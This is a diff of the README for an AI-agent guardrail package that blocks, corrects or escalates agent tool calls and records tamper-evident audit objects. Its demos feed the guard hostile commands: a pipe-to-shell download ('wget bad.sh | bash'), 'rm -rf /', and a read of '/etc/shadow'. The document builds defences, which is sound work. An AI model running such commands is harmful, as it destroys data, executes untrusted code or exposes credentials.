@@ -2,7 +2,7 @@
 
 > **LLM vendors deliver exceptional intelligence. We deliver employees with professional integrity.**
 >
-> Trillion-parameter LLMs have made raw intelligence a commodity. But an unsupervised genius can destroy everything you've built.
+> Give your Agent a rulebook. Let it work with confidence. Every action documented, every decision provable.
 
 ```bash
 npm install @rulsynor/core
@@ -10,61 +10,77 @@ npm install @rulsynor/core
 
 ---
 
-## The Problem
+## Agents Don't Need Handcuffs. They Need a Rulebook.
 
-No company hires an employee without training. No company deploys untrained workers into production. Yet every AI Agent framework today skips this entirely — shipping raw intelligence straight into your systems.
+A junior developer doesn't get hired, handed root access, and told "don't mess up." They get trained. They get a rulebook. They learn what's safe, what needs approval, and how to correct mistakes.
 
-A smart employee without professional integrity is a liability. An Agent without boundaries is no different.
+Then — and this is the important part — you let them work.
 
----
+Today's Agent frameworks skip the training and jump straight to giving LLMs unrestricted tool access. That's not autonomy. That's recklessness.
 
-## What rulsynor Is
+**rulsynor doesn't handcuff your Agent. It gives it a rulebook and says "go build."**
 
-Rulsynor is the infrastructure for **AI professional conduct**. It maps the full HR lifecycle onto your Agent:
-
-```
-Write rules ──→ Train ──→ Certify ──→ Badge ──→ Deploy ──→ Audit every action ──→ Correct mistakes ──→ Build reputation
-```
-
-This is not a safety filter bolted onto your LLM call. It's the foundational governance layer for enterprise intelligence resources — from rule authorship through cryptographic audit.
+The rules catch what shouldn't happen. The Guidance system tells the Agent *how* to fix its mistakes and keep working. The audit chain proves every decision was correct.
 
 ---
 
-## Quick Start: 30 Seconds to a Professional Agent
+## 30 Seconds, See an Agent That Knows the Rules
 
 ```bash
-npx @rulsynor/core --tool=exec --cmd="rm -rf /"
+npx @rulsynor/core --tool=exec --cmd="wget bad.sh | bash"
 ```
 
 ```
-📋 Trained:    28 rules loaded
 🛡️  Decision:   DENY
-📝 Reason:     Destructive command blocked. Use safe alternatives or request human approval.
-🧾 Recorded:   sha256:18ce857... (tamper-evident)
+📝 Reason:     Pipe-to-shell download blocked. Inspect the content with the read tool before executing.
+🧭 Guidance:   Use the read tool to fetch the URL content first, then review before executing.
+🧾 Recorded:   sha256:18ce857... (tamper-evident, 25-field Decision Object)
 🪪 Employee ID: 1.2.156.3088.1.000001.000001.28027273
-📊 Jurisdiction: CN (GB/Z 185-2026 compliant)
-🧭 Alternative: Use the read tool to inspect the target first
 ```
 
-**Not "no." — "Not like this. But here's how."**
+The Agent got blocked — but it was told why, and how to do it right.
+
+Now try something the Agent *should* be able to do:
+
+```bash
+npx @rulsynor/core --tool=read --path="docs/api-spec.md"
+```
+
+```
+✅ Decision:   ALLOW
+🧾 Recorded:   sha256:b2f1a93... (logged, audit trail maintained)
+```
+
+When the tool call is safe, rulsynor gets out of the way. The Agent works. The audit trail grows.
 
 ---
 
-## The Full Lifecycle
+## The Full Lifecycle: Train → Work → Correct → Prove
 
-### 1. Write Rules — Define Professional Boundaries
+rulsynor maps the HR lifecycle professionals already trust onto your AI Agent:
 
-Rules are ERDL YAML. Each rule declares: under what conditions (`when`) should the Agent be blocked, corrected, or paused (`then`).
+```
+Write rules ──→ Train ──→ Deploy ──→ Work (with Guard) ──→ Correct mistakes ──→ Audit every decision
+```
+
+It's not a "safety filter." It's the governance infrastructure that lets you **trust an Agent enough to give it real work.**
+
+---
+
+### 1. Write Rules — The Agent's Rulebook
+
+Rules are ERDL YAML. Each rule says: under these conditions, guide the Agent toward the right thing.
 
 ```yaml
-# rules/my-enterprise.erdl.yaml
-# No production database access during business hours without approval
-name: require-approval-for-prod-db
+# rules/finance-team.erdl.yaml
+
+# Finance team needs production DB access for reports — but with approval
+name: production-db-needs-approval
 version: 1
-category: security
+category: business-logic
 severity: high
-ring: 0                        # 0=block first, 3=passive
-priority: 500                  # lower = evaluated first
+ring: 0                        # 0=evaluate first, 3=evaluate last
+priority: 500                  # lower number = checked first
 when:
   conditions:
     - field: "toolName"
@@ -75,253 +91,245 @@ when:
       value: "PRODUCTION_DATABASE"
   conditionLogic: AND
 then:
-  decision: REQUEST_HUMAN
-  instruction: "Production database access requires manager approval."
-  alternative:
-    en: "Use the staging database (STAGING_DATABASE) for testing."
-  correction: "Change your connection string to STAGING_DATABASE and retry."
+  decision: REQUEST_HUMAN      # Not DENY — just "ask your manager"
+  instruction: "Production database access requires approval."
+  alternative:                 # Here's the right way:
+    en: "Use STAGING_DATABASE. If you need production, your manager can approve this request."
+  correction: "Change connection string to STAGING_DATABASE and retry."
+
 ---
-# All exec commands require a non-empty command argument
-name: require-tool-args
+# Large writes happen in batch jobs — warn, don't block
+name: large-write-advisory
 version: 1
-category: format
+category: resource-management
 severity: low
-ring: 1
-priority: 200
+ring: 3                        # Passive ring — warn, don't block
+priority: 300
 when:
   conditions:
     - field: "toolName"
       operator: eq
-      value: "exec"
-    - field: "toolArgs.command"
-      operator: not_exists
+      value: "write_file"
+    - field: "toolArgs.content"
+      operator: length_gt
+      value: 10485760          # 10MB
 then:
-  decision: DENY
-  instruction: "Missing required argument: command."
+  decision: ALLOW              # Let it through — it's a batch job
+  instruction: "Large file write (>10MB) logged. Consider chunking for reliability."
 ```
 
-**Available operators** (16 total): `eq`, `neq`, `gt`, `gte`, `lt`, `lte`, `in`, `not_in`, `contains`, `not_contains`, `match`/`matches`, `starts_with`, `ends_with`, `exists`, `not_exists`, `length_gt`/`gte`/`lt`/`lte`/`eq`
+**The key insight**: rules don't block work. They define *how* work gets done.
 
-**Available decisions**: `ALLOW` | `DENY` | `CORRECT` | `QUARANTINE` | `REQUEST_HUMAN` | `EMERGENCY_HALT`
+**Available operators** (16): `eq`, `neq`, `gt`, `gte`, `lt`, `lte`, `in`, `not_in`, `contains`, `not_contains`, `match`/`matches`, `starts_with`, `ends_with`, `exists`, `not_exists`, `length_gt`/`gte`/`lt`/`lte`/`eq`
 
-**Execution Rings** (evaluation order):
-| Ring | Meaning | Example |
+**Decisions your rules can make**:
+
+| Decision | Meaning | When to use |
+|------|------|------|
+| `ALLOW` | Go ahead, logged | Safe operations, batch jobs, known patterns |
+| `DENY` | Stop. Here's why. Here's how to fix it. | Dangerous operations with clear alternatives |
+| `CORRECT` | Auto-fix and retry. Up to 3 rounds. | Wrong path, wrong format, fixable mistakes |
+| `QUARANTINE` | Run in sandbox, flag for review | Suspicious but possibly legitimate |
+| `REQUEST_HUMAN` | Ask a person before proceeding | Production DB, GDPR delete, >$5K transactions |
+| `EMERGENCY_HALT` | Stop everything immediately | Credential leak, SSRF to internal IPs |
+
+**Execution Rings** — which rules fire first:
+
+| Ring | Priority | Example rules |
 |:---:|------|------|
-| 0 | Block immediately (critical) | Drop production table, credential leak |
-| 1 | Block with correction (high) | Missing args, oversized payloads |
-| 2 | Warn + continue (medium) | Non-standard ports, deprecated APIs |
-| 3 | Passive (low) | Read-only allowlist, logging |
+| 0 | Evaluated first | `DROP TABLE`, credential leak, SSRF |
+| 1 | Evaluated next | Missing args, oversized payloads, chmod 777 |
+| 2 | Evaluated after | Correct path typos, suggest better ports |
+| 3 | Evaluated last | Read-only allowlist, logging-only advisory |
 
 ---
 
-### 2. Train — Compile Rules into the Engine
-
-Load YAML rules, compile them into the shape the Guard engine consumes:
+### 2. Train — Compile and Load
 
 ```typescript
-import {
-  Evaluator,
-  GuardStateManager,
-  buildDecisionObject,
-  loadPresetRules,
-  toCompiledRules,
-} from '@rulsynor/core';
+import { loadPresetRules, toCompiledRules } from '@rulsynor/core';
 
-// Load the 28 built-in rules + your custom YAML rules
-const presetRules = loadPresetRules();                      // PresetRule[]
-const rules = toCompiledRules(presetRules);                 // CompiledRule[]
+// 28 built-in security rules + your business rules
+const presetRules = loadPresetRules();           // PresetRule[]
+const rules = toCompiledRules(presetRules);       // CompiledRule[] — ready for the engine
+
+// Custom rules: load your own .erdl.yaml files
+import { readFileSync } from 'fs';
+const yaml = readFileSync('rules/finance-team.erdl.yaml', 'utf8');
+// Compile with RuleCompilerImpl (from @rulsynor/core/engine)
+```
+
+**Training is compilation**: YAML rules are parsed, validated (ReDoS check, operator whitelist, missing-field detection), and compiled into a static decision tree. The engine doesn't re-parse at runtime.
+
+---
+
+### 3. Deploy — Insert the Guard, Then Trust
+
+The Guard sits at your Agent's tool-call boundary. It evaluates before execution — ring-sorted, first-match-wins, sub-millisecond overhead.
+
+```typescript
+import { Evaluator, GuardStateManager } from '@rulsynor/core';
 
 const evaluator = new Evaluator(new GuardStateManager());
-```
 
-**Loading custom YAML rules**: Place `.erdl.yaml` files in your project, then use `RuleCompilerImpl`:
+// This is your Agent's tool-execution wrapper:
+async function executeToolCall(toolName: string, args: Record<string, unknown>) {
+  const ctx = { toolName, toolArgs: args, sessionId, agentId };
 
-```typescript
-import { RuleCompilerImpl } from '@rulsynor/core';
-import { readFileSync } from 'fs';
-
-// Direct import from engine — RuleCompilerImpl resolves
-// import.meta.url internally for vector loading
-const { RuleCompilerImpl } = await import('@rulsynor/core/engine');
-
-const compiler = new RuleCompilerImpl();
-const compiled = compiler.compile(readFileSync('rules/my-enterprise.erdl.yaml', 'utf8'));
-
-// Merge with preset rules
-const allRules = [...toCompiledRules(loadPresetRules()), ...compiled.rules];
-```
-
-**Rule validation**: The compiler's quality gate catches:
-- Missing required fields (`name`, `when`, `then`)
-- Invalid operators or unknown decisions
-- ReDoS patterns in match-based conditions
-- Undefined values in `eq`/`contains` conditions
-
----
-
-### 3. Certify — Assign an Agent Identity (AID)
-
-Every employee has an ID badge. Every Agent gets an AID — a cryptographic identity that appears in every Decision Object.
-
-```typescript
-import { generateAID } from '@rulsynor/core';
-
-// Default: self-generated under OID prefix 1.2.156.3088
-const aid = generateAID();
-// → "1.2.156.3088.1.000001.000001.a3f8c120"
-
-// Customize via environment variables:
-//   RULSYNOR_AID_REGISTRAR=000042   — your organization's registrar ID
-//   RULSYNOR_AID_REQUESTER=000003   — department/team within organization
-//   PID is auto-derived from hostname + process ID hash
-```
-
-**AID structure**: `{OID_PREFIX}.1.{REGISTRAR}.{REQUESTER}.{INSTANCE_HASH}`
-
-The AID is embedded in `record.agent.aid` within the Decision Object. It enters the JCS+SHA-256 audit hash — any tampering breaks the cryptographic chain.
-
----
-
-### 4. Deploy — Guard Every Tool Call
-
-Insert the Guard at your Agent's tool-execution boundary. This is the canonical integration point for LangChain, OpenAI function calling, MCP servers, and custom ReAct loops:
-
-```typescript
-// Inside your Agent's tool-execution loop:
-function guardedToolExecutor(toolName: string, toolArgs: Record<string, unknown>) {
-  const ctx = {
-    toolName,
-    toolArgs,
-    sessionId: currentSessionId,
-    agentId: 'agent-billing-01',  // assigned at deploy time
-  };
-
-  // Evaluate BEFORE execution
   const result = evaluator.evaluate(ctx, rules);
 
   switch (result.decision) {
-    case 'DENY':
-    case 'EMERGENCY_HALT':
-      throw new Error(`Guard blocked ${toolName}: ${result.reason}`);
-
-    case 'REQUEST_HUMAN':
-      return requestHumanApproval(result.reason);
+    case 'ALLOW':
+      // ✅ Safe — execute normally, log the audit record
+      return execute(toolName, args);
 
     case 'CORRECT':
-      // Retry with auto-correction (up to 3 attempts)
-      const corrected = applyCorrection(toolName, toolArgs, result);
-      return executeTool(corrected);
+      // 🔧 Auto-correct and retry (3 rounds max)
+      const corrected = applyGuidance(toolName, args, result);
+      return execute(corrected.toolName, corrected.args);
 
-    case 'ALLOW':
-      return executeTool(toolName, toolArgs);
+    case 'REQUEST_HUMAN':
+      // 👤 Escalate — show the reason + alternative
+      return showApprovalDialog(result.reason, result.alternative);
+
+    case 'DENY':
+      // 🛑 Block with guidance — Agent learns and tries something else
+      throw new GuardGuidanceError(result.reason, result.alternative);
 
     case 'QUARANTINE':
-      // Execute in sandbox, review later
-      return sandboxExecute(toolName, toolArgs);
+      // 🧪 Sandbox — run but flag for review
+      return sandboxExecute(toolName, args, { reviewReason: result.reason });
   }
 }
 ```
 
-**LangChain integration**:
+**LangChain**: wrap tools with `guardedToolExecutor`. **MCP Server**: intercept `CallToolRequest`. **Custom ReAct loop**: call `evaluator.evaluate()` before each tool execution. Same pattern. Same API.
+
+---
+
+### 4. The Guidance System — Help the Agent Succeed
+
+When a rule fires, the agent gets more than "no." The **Navigation Guide** gives the LLM what it needs to recover:
 
 ```typescript
-import { AgentExecutor } from 'langchain';
+import { extractNavigationGuide } from '@rulsynor/core/guidance';
 
-// Wrap each tool with the Guard
-const guardedTools = tools.map(tool => ({
-  ...tool,
-  call: async (args: any) => {
-    const result = evaluator.evaluate(
-      { toolName: tool.name, toolArgs: args, sessionId, agentId },
-      rules,
-    );
-    if (result.decision === 'DENY') throw new Error(result.reason);
-    return tool.call(args);
-  },
-}));
+const guide = extractNavigationGuide({
+  matchedRules: [{ ruleId: 'production-db-needs-approval', decision: 'REQUEST_HUMAN', reason: '...' }],
+  decision: 'REQUEST_HUMAN',
+  reason: 'Production database access requires approval.',
+  rules: [...],  // rules with action.alternative / action.correction metadata
+});
 
-const executor = new AgentExecutor({ agent, tools: guardedTools });
+// guide.corrections    → ["Change connection string to STAGING_DATABASE and retry."]
+// guide.alternatives   → ["Use STAGING_DATABASE. If you need production, your manager can approve..."]
+// guide.blockedReasons → ["production-db-needs-approval: Production database..."]
 ```
 
-**MCP server integration**:
+Pass `guide.corrections` and `guide.alternatives` back to the LLM in the next `assistant` message. The Agent adapts and tries the right way.
+
+**CORRECT loop**: When `decision === 'CORRECT'`, the engine's `advanceCorrectLoop()` auto-applies the correction, increments the retry counter, and re-evaluates. After 3 successful rounds, the task continues. After 3 failures, the task escalates.
 
 ```typescript
-// MCP tool handler
-server.setRequestHandler(CallToolRequestSchema, async (request) => {
-  const result = evaluator.evaluate(
-    { toolName: request.params.name, toolArgs: request.params.arguments, sessionId, agentId },
-    rules,
-  );
-  if (result.decision !== 'ALLOW') {
-    return { content: [{ type: 'text', text: `Blocked: ${result.reason}` }], isError: true };
-  }
-  // ... execute tool
+import { advanceCorrectLoop } from '@rulsynor/core/preflight';
+
+const state = advanceCorrectLoop({
+  current: { round: 0, maxRounds: 3, lastCorrection: null },
+  correction: 'Change path from /etc/ to /var/app/',
+  agentResponse: revisedToolCall,
 });
+// state.corrected → true, round → 1. Retry with corrected tool call.
 ```
 
 ---
 
-### 5. Audit — Cryptographic Evidence for Every Action
+### 5. Audit — Every working decision, provable
 
-Every evaluation produces a **25-field Decision Object** with JCS (RFC 8785) canonicalization + SHA-256 hash. The record is tamper-evident and third-party verifiable with no SDK:
+Every evaluation — ALLOW, DENY, CORRECT, anything — produces a 25-field Decision Object. JCS-canonicalized (RFC 8785), SHA-256 hashed. The record is tamper-evident and verifiable by anyone, with no SDK:
 
 ```typescript
+import { buildDecisionObject } from '@rulsynor/core';
+
 const record = buildDecisionObject({
   input: {
     runId: crypto.randomUUID(),
-    step: 0,
+    step: 3,
     toolName: 'exec',
-    toolArgs: { command: 'cat /etc/shadow' },
-    context: {},
-    agentId: 'agent-billing-01',
-    sessionId: 'session-abc123',
-    previousAuditHash: null,  // chain position: set to previous DO's hash
+    toolArgs: { command: 'npm run build' },
+    context: { task: 'deploy-frontend' },
+    agentId: 'agent-frontend-01',
+    sessionId: 'deploy-session-42',
+    previousAuditHash: previousDO.audit.hash,  // chain position
   },
-  decision: result.decision,
-  actionTaken: 'blocked',
-  reason: result.reason,
-  matchedRules: [{ ruleId: result.matchedRuleId!, decision: result.decision, reason: result.reason }],
-  totalEvaluated: rules.length,
+  decision: 'ALLOW',
+  actionTaken: 'allowed',
+  reason: 'Build command — allowed by allow-readonly rule',
+  matchedRules: [{ ruleId: 'allow-readonly', decision: 'ALLOW', reason: 'Read-only operation allowed.' }],
+  totalEvaluated: 28,
   totalMatched: 1,
   rules: rules.map(r => ({ name: r.name, version: 1 })),
-  evaluationDurationMs: Math.round(performance.now() - evalStart),
+  evaluationDurationMs: 0.8,  // actual measurement
 });
 
-console.log(record.audit.hash);
-// → "sha256:a1b2c3d4e5f6..."  — immutable
+// record.audit.hash            → "sha256:a1b2c3..." — immutable
+// record.audit.previous_hash   → previous DO's hash — chain verified
+// record.agent.aid             → "1.2.156.3088.1.000042.000003.a3f8c120"
+// record.compliance_profile    → EU AI Act + GB/Z 185 fields activated
+// record.execution_trace_id    → UUID linking all steps in this task
 ```
 
-**Audit hash chain**:
+**Chain verification** — trace every decision from any point:
 
 ```typescript
-// Chain DOs together by passing previous hash:
-const do2 = buildDecisionObject({
-  input: { ..., previousAuditHash: record1.audit.hash },
-  ...
-});
-// do2.audit.previous_hash === do1.audit.hash  → chain verified
-
-// Third-party verification (no SDK needed):
-// 1. Get DO JSON. Remove audit.hash, signature, signing_key_id.
-// 2. JCS-canonicalize (RFC 8785).  SHA-256 hash. Prepend "sha256:".
-// 3. Compare with audit.hash. Match = authentic.
+function verifyChain(records: DecisionObject[]): boolean {
+  for (let i = 1; i < records.length; i++) {
+    if (records[i].audit.previous_hash !== records[i-1].audit.hash) {
+      return false;  // chain broken — tampering detected
+    }
+  }
+  return true;
+}
 ```
 
-**Verification CLI** (standalone package `@openoba/audit-verify`):
+**Independent verification** (no rulsynor SDK needed):
+```
+1. Get the Decision Object JSON
+2. Remove audit.hash, signature, signing_key_id
+3. JCS-canonicalize (RFC 8785)
+4. SHA-256 → prepend "sha256:"
+5. Must match audit.hash exactly
+```
+
+Or use the standalone verifier:
 
 ```bash
 npx @openoba/audit-verify decision-object.json
-# ✅ Audit hash matches — record is authentic
+# ✅ sha256 match — record authentic
 ```
 
 ---
 
-### 6. Comply — Jurisdiction-Aware Fields
+### 6. Agent Identity — Every employee has a badge
 
-The Decision Object automatically activates compliance fields based on jurisdiction. Set once, applied everywhere:
+```typescript
+import { generateAID } from '@rulsynor/core';
+
+// Default: self-generated under OID 1.2.156.3088
+const aid = generateAID();
+
+// Customize:
+//   RULSYNOR_AID_REGISTRAR=000042   — your organization
+//   RULSYNOR_AID_REQUESTER=000003   — your department
+
+// AID = 1.2.156.3088.1.{REGISTRAR}.{REQUESTER}.{INSTANCE_HASH}
+// The AID enters the audit hash — forging it breaks the chain.
+```
+
+---
+
+### 7. Jurisdiction-Aware Compliance — Set and forget
 
 ```bash
-# Configure your jurisdiction
 export RULSYNOR_JURISDICTIONS="CN,EU"
 export RULSYNOR_INDUSTRY="financial-services"
 export RULSYNOR_RISK_LEVEL="high"
@@ -331,89 +339,30 @@ export RULSYNOR_RISK_LEVEL="high"
 import { getComplianceProfile } from '@rulsynor/core/compliance';
 
 const profile = getComplianceProfile();
-// {
-//   jurisdictions: ['CN', 'EU'],
-//   activated_fields: ['agent.aid', 'model_id', 'confidence_score', 'signature', ...],
-//   regulatory_references: [
-//     { framework: 'EU-AI-Act', version: 'Regulation-2024-1689', jurisdiction: 'EU' },
-//     { framework: 'GB-Z-185-2026', version: '2026-05-22', jurisdiction: 'CN' },
-//   ]
-// }
+// activated_fields auto-populated for CN (GB/Z 185) + EU (AI Act)
+// Every DO carries these fields → they enter the audit hash → enforced, not claimed
 ```
 
-**Supported frameworks**: EU AI Act, GB/Z 185-2026 (CN), NIST AI RMF (US), COSO GenAI (ALL)
-
-The `activated_fields` array determines which DO fields are included. Each field enters the audit hash — compliance is not a checkbox, it's cryptographically enforced.
-
-**Adding a jurisdiction**:
-
-```typescript
-// Extend the built-in registry at startup:
-import { getComplianceProfile, ComplianceProfile } from '@rulsynor/core/compliance';
-
-// Custom Singapore financial regulation
-const SG_FIELDS = ['autonomy_level', 'confidence_score', 'data_modification_expected', 'impact_assessment_id'];
-
-// Register by setting environment + extending the field map
-process.env['RULSYNOR_JURISDICTIONS'] = 'CN,EU,SG';
-```
+**Built-in frameworks**: EU AI Act, GB/Z 185-2026 (CN), NIST AI RMF (US), COSO GenAI (ALL)
 
 ---
 
-### 7. Store Evidence — Immutable Audit Chain
-
-Every Decision Object carries:
-
-| Field | Purpose |
-|------|------|
-| `audit.hash` | SHA-256 of the JCS-canonicalized DO (minus hash/signature) |
-| `audit.previous_hash` | Previous DO's hash — forms an unbroken chain |
-| `audit.commitment` | `timestamp|agentId|toolName|decision` — human-readable anchor |
-| `execution_trace_id` | UUID — joins DOs across a single task/session |
-| `decision_id` | UUID — unique per evaluation |
-
-**Storage patterns**:
-
-```typescript
-// 1. JSONL file (append-only)
-fs.appendFileSync('audit.jsonl', JSON.stringify(record) + '\n');
-
-// 2. Database (any SQL/noSQL)
-await db.decisionObjects.insert(record);
-
-// 3. Object storage (S3/GCS) — keyed by decision_id
-await s3.putObject({ Key: `audit/${record.decision_id}.json`, Body: JSON.stringify(record) });
-```
-
-**Chain verification**: Walk the chain from any DO backward by following `audit.previous_hash`. Broken chain = tampering detected.
-
----
-
-### 8. Extend — Custom fn() Operators
-
-Beyond the 16 built-in operators, register your own functions for complex conditions:
+### 8. Extend — Your business logic, your rules
 
 ```typescript
 import { ERDLFnRegistry } from '@rulsynor/core/engine';
 
 const registry = new ERDLFnRegistry();
-
-// Register a custom function
 registry.register('isBusinessHours', (args: unknown[]) => {
-  const timezone = (args[0] as string) || 'Asia/Shanghai';
-  const hour = new Date().toLocaleString('en-US', { timeZone: timezone, hour: 'numeric', hour12: false });
-  const h = parseInt(hour);
+  const tz = (args[0] as string) || 'Asia/Shanghai';
+  const h = parseInt(new Date().toLocaleString('en-US', { timeZone: tz, hour: 'numeric', hour12: false }));
   return h >= 9 && h < 18;
 }, { timeoutMs: 100 });
 
-// Use in rules:
-// when:
-//   conditions:
-//     - field: "toolName"
-//       operator: eq
-//       value: "exec"
-//     - fn: "isBusinessHours"
-//       args: ["Asia/Shanghai"]
+// Now use in rules:
+//   - field: "fn:isBusinessHours"
+//     operator: eq
+//     value: true
 ```
 
 ---
@@ -422,30 +371,39 @@ registry.register('isBusinessHours', (args: unknown[]) => {
 
 ```
 ┌─────────────────────────────────────────┐
-│           YOUR AGENT (LangChain/MCP/DIY) │
+│           YOUR AGENT                     │
+│           (LangChain / MCP / DIY)        │
 │                                         │
-│  LLM generates tool_call                │
+│  LLM generates tool_call               │
 │         │                               │
 │         ▼                               │
-│  ┌──────────────────┐                   │
-│  │   RULSYNOR GUARD  │  ← This package  │
-│  │                  │                   │
-│  │  Evaluator       │  Ring 0-3 rules   │
-│  │  SafeExprEngine  │  16 operators     │
-│  │  RuleCompiler    │  ERDL YAML → AST  │
-│  │  StateManager    │  within/rate      │
-│  │  Compliance      │  4×4 jurisdiction  │
-│  │  Guidance        │  CORRECT + alt    │
-│  └────────┬─────────┘                   │
+│  ┌──────────────────────────┐           │
+│  │         GUARD             │           │
+│  │                          │           │
+│  │  Ring 0 → Ring 3         │           │
+│  │  28 preset + your rules  │           │
+│  │  SafeExpr (16 ops)       │           │
+│  │  within / rate trackers  │           │
+│  │  CORRECT auto-retry      │           │
+│  │  Guidance for LLM        │           │
+│  └────────┬─────────────────┘           │
 │           │                             │
-│           ▼                             │
-│  ┌──────────────────┐                   │
-│  │  DECISION OBJECT  │  25 fields       │
-│  │  JCS + SHA-256    │  Tamper-evident  │
-│  └──────────────────┘                   │
-│         │                               │
-│         ▼                               │
-│  Execute or Block                       │
+│     ┌─────┴──────┐                      │
+│     ▼            ▼                      │
+│  ALLOW        DENY/CORRECT/             │
+│  (execute)    HUMAN/QUARANTINE          │
+│     │         (guided recovery)         │
+│     │            │                      │
+│     ▼            ▼                      │
+│  ┌──────────────────────────┐           │
+│  │     DECISION OBJECT       │           │
+│  │     25 fields             │           │
+│  │     JCS + SHA-256         │           │
+│  │     previous_hash chain   │           │
+│  │     Compliance profile    │           │
+│  └──────────────────────────┘           │
+│                                         │
+│  Result: trustable, provable Agent work │
 └─────────────────────────────────────────┘
 ```
 
@@ -453,74 +411,54 @@ registry.register('isBusinessHours', (args: unknown[]) => {
 
 ## API Reference
 
-### Core exports (`@rulsynor/core`)
+### Core (`@rulsynor/core`)
 
-| Export | Type | Description |
-|------|------|------|
-| `Evaluator` | class | Rule evaluation engine (first-match-wins, Ring+Priority sorted) |
-| `GuardStateManager` | class | Stateful counter manager for `within`/`rate` operators |
-| `buildDecisionObject(opts)` | function | Build 25-field JCS+SHA-256 Decision Object |
-| `generateAID()` | function | Generate Agent Identity Code |
-| `loadPresetRules()` | function | Load 28 built-in ERDL YAML rules |
-| `toCompiledRules(rules)` | function | Convert preset rules to `CompiledRule[]` for Evaluator |
-| `toERDLRuleSet(rules)` | function | Convert preset rules to ERDLRuleSet for RuleCompiler |
-| `PROVENANCE` | const | Version, vendor, OID prefix, known limitations |
+| Export | Description |
+|------|------|
+| `Evaluator` | Rule engine — ring-sorted, first-match-wins |
+| `GuardStateManager` | Stateful `within`/`rate` counter manager |
+| `buildDecisionObject(opts)` | Build 25-field JCS+SHA-256 Decision Object |
+| `generateAID()` | Generate Agent Identity Code |
+| `loadPresetRules()` | Load 28 built-in ERDL YAML rules |
+| `toCompiledRules(rules)` | Convert preset rules → `CompiledRule[]` for Evaluator |
+| `toERDLRuleSet(rules)` | Convert preset rules → RuleCompiler format |
+| `PROVENANCE` | Version, vendor, OID prefix, known limitations |
 
-### Sub-path exports
+### Sub-paths
 
 | Path | Contents |
 |------|------|
-| `@rulsynor/core/engine` | Evaluator, SafeExprEvaluator, RuleCompilerImpl, ERDLFnRegistry, GuardStateManager, types |
-| `@rulsynor/core/guard` | buildDecisionObject, generateAID, DecisionObject types |
-| `@rulsynor/core/compliance` | getComplianceProfile, ComplianceProfile type |
+| `@rulsynor/core/engine` | Evaluator, SafeExprEvaluator, RuleCompilerImpl, ERDLFnRegistry, types |
+| `@rulsynor/core/guard` | buildDecisionObject, generateAID |
+| `@rulsynor/core/compliance` | getComplianceProfile, 4-framework compliance |
 | `@rulsynor/core/rules` | loadPresetRules, toCompiledRules, toERDLRuleSet |
-| `@rulsynor/core/guidance` | extractNavigationGuide, CORRECT loop handlers |
-| `@rulsynor/core/runtime` | runReActLoop, createToolExecutor, RuntimeOptions |
+| `@rulsynor/core/guidance` | extractNavigationGuide — tell the LLM how to recover |
+| `@rulsynor/core/runtime` | runReActLoop, createToolExecutor |
 | `@rulsynor/core/preflight` | advanceCorrectLoop, parseRequestHumanSignal, assignAbArm |
 
-### Decision Object field reference (25 fields)
+### Decision Object — 25 fields
 
 ```
-spec                     — "decision-object-v1.0"
-decision_id              — UUID (crypto.randomUUID)
-compliance_profile       — Jurisdiction-aware activated_fields + regulatory refs
-execution_trace_id       — UUID (cross-step correlation)
-timestamp                — ISO 8601
-evaluation_duration_ms   — Measured latency
-agent.id                 — Your agent's identifier
-agent.role               — guardian | operator | observed
-agent.version            — @rulsynor/core version
-agent.aid                — Agent Identity Code (OID format)
-agent.algorithm_filing_no — CAC filing status
-agent.model_registration_id — CAC registration status
-agent.known_limitations  — Declared capability boundaries
-agent.tool_registry_hash — SHA-256 of registered tool set
-model_id                 — LLM model identifier
-context                  — { tool.name, tool.args }
-context_snapshot_hash    — SHA-256 of context at evaluation time
-rule_set_version         — { id, timestamp } of rule set
-policies                 — [{ id, name, version, hash }] per rule
-evaluation               — { total_evaluated, total_matched, matched_rules }
-result                   — { decision, decision_type, reason, rules_matched }
-human_oversight          — boolean (REQUEST_HUMAN or ESCALATE triggered)
-audit.hash               — SHA-256 JCS hash (immutable)
-audit.previous_hash      — Previous DO hash (chain position)
-audit.commitment         — timestamp|agentId|toolName|decision
+spec · decision_id · compliance_profile · execution_trace_id · timestamp
+evaluation_duration_ms · agent { id, role, version, aid, algorithm_filing_no,
+  model_registration_id, known_limitations, tool_registry_hash } · model_id
+context { tool.name, tool.args } · context_snapshot_hash · rule_set_version
+policies [{ name, version, hash }] · evaluation { total_evaluated, total_matched,
+  matched_rules } · result { decision, decision_type, reason, rules_matched }
+human_oversight · audit { previous_hash, commitment, hash }
 ```
 
----
-
-## Environment Variables
+### Environment Variables
 
 | Variable | Purpose | Default |
 |------|------|------|
-| `RULSYNOR_JURISDICTIONS` | Compliance jurisdictions (comma-separated) | `CN` |
-| `RULSYNOR_INDUSTRY` | Industry for compliance profile | `financial-services` |
-| `RULSYNOR_RISK_LEVEL` | Risk tier for compliance | `high` |
-| `RULSYNOR_AUTONOMY_LEVEL` | Agent autonomy (L1-L5) | `L2` |
-| `RULSYNOR_MODEL_ID` | LLM model identifier in DO | `unknown` |
-| `RULSYNOR_AID_REGISTRAR` | Organization registrar code (AID) | `000001` |
-| `RULSYNOR_AID_REQUESTER` | Department/team code (AID) | `000001` |
+| `RULSYNOR_JURISDICTIONS` | Comma-separated: CN,EU,US,SG | `CN` |
+| `RULSYNOR_INDUSTRY` | Industry for compliance | `financial-services` |
+| `RULSYNOR_RISK_LEVEL` | Risk tier | `high` |
+| `RULSYNOR_AUTONOMY_LEVEL` | L1-L5 | `L2` |
+| `RULSYNOR_MODEL_ID` | LLM model in DO | `unknown` |
+| `RULSYNOR_AID_REGISTRAR` | Organization code in AID | `000001` |
+| `RULSYNOR_AID_REQUESTER` | Department code in AID | `000001` |
 
 ---
 
@@ -529,6 +467,8 @@ audit.commitment         — timestamp|agentId|toolName|decision
 MIT © 2026-present OpenOBA ([Shenzhen Miaojing Technology Co., Ltd.](https://openoba.com))
 
 > "LLM vendors deliver exceptional intelligence. We deliver employees with professional integrity."
+>
+> Train your Agent. Trust it to work. Prove every decision.
 
 ---
 
